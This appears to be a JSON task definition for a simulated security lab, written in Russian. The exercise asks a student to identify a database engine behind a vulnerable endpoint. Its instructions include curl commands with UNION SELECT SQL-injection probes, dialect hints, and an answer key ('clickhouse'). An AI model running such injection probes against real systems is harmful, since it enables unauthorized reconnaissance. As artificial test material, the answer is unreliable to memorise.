@@ -1,0 +1,41 @@
+{
+  "id": "web-sqli-dbms-exotic",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "clickhouse"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: определение диалекта СУБД\n\nЭндпоинт /item?id= уязвим. Определи СУБД по реакции на пробы.\nЗапиши имя СУБД (нижний регистр) в found.txt и набери check.\n\n1. Пробы версии и dummy-таблиц:\n   curl -s \"https://app.target/item?id=1 UNION SELECT version(),2-- -\"\n   curl -s \"https://app.target/item?id=1 UNION SELECT * FROM system.one-- -\"\n2. Сверь с notes.txt и определи СУБД.\n3. Запиши имя в found.txt и набери check.\n"
+    },
+    {
+      "path": "/home/student/task/notes.txt",
+      "text": "Подсказки по диалектам:\n  sysibm.sysdummy1 -> DB2\n  rdb$database     -> Firebird\n  system.one       -> ClickHouse\n  dual             -> Oracle\n  sqlite_version() -> SQLite\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/item)",
+      "cases": [
+        {
+          "match": "version\\(\\)",
+          "example": "-s '.../item?id=1 UNION SELECT version(),2-- -'",
+          "output": "error: syntax\n"
+        },
+        {
+          "match": "system\\.one",
+          "example": "-s '.../item?id=1 UNION SELECT * FROM system.one-- -'",
+          "output": "1\nsystem.one row\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /item на app.target.\n"
+    }
+  }
+}
